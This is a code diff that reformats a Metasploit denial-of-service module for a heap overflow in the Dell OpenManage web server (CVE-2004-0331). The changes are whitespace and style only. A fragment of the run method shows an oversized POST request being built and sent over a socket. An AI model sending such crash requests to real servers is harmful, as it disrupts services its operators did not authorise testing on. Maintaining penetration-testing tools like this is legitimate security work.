@@ -8,33 +8,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Dell OpenManage POST Request Heap Overflow (win32)',
-      'Description'    => %q{
-        This module exploits a heap overflow in the Dell OpenManage
-        Web Server (omws32.exe), versions 3.2-3.7.1. The vulnerability
-        exists due to a boundary error within the handling of POST requests,
-        where the application input is set to an overly long file name.
-        This module will crash the web server, however it is likely exploitable
-        under certain conditions.
-      },
-      'Author'         => [ 'aushack' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Dell OpenManage POST Request Heap Overflow (win32)',
+        'Description' => %q{
+          This module exploits a heap overflow in the Dell OpenManage
+          Web Server (omws32.exe), versions 3.2-3.7.1. The vulnerability
+          exists due to a boundary error within the handling of POST requests,
+          where the application input is set to an overly long file name.
+          This module will crash the web server, however it is likely exploitable
+          under certain conditions.
+        },
+        'Author' => [ 'aushack' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-02/0650.html' ],
           [ 'BID', '9750' ],
           [ 'OSVDB', '4077' ],
           [ 'CVE', '2004-0331' ],
         ],
-      'DisclosureDate' => '2004-02-26'))
+        'DisclosureDate' => '2004-02-26'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(1311),
         OptBool.new('SSL', [true, 'Use SSL', true]),
       ],
-    self.class)
+      self.class
+    )
   end
 
   def run
@@ -46,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
     sploit << "Content-Length: #{foo.length}\r\n\r\n"
     sploit << foo
 
-    sock.put(sploit +"\r\n\r\n")
+    sock.put(sploit + "\r\n\r\n")
 
     disconnect
   end
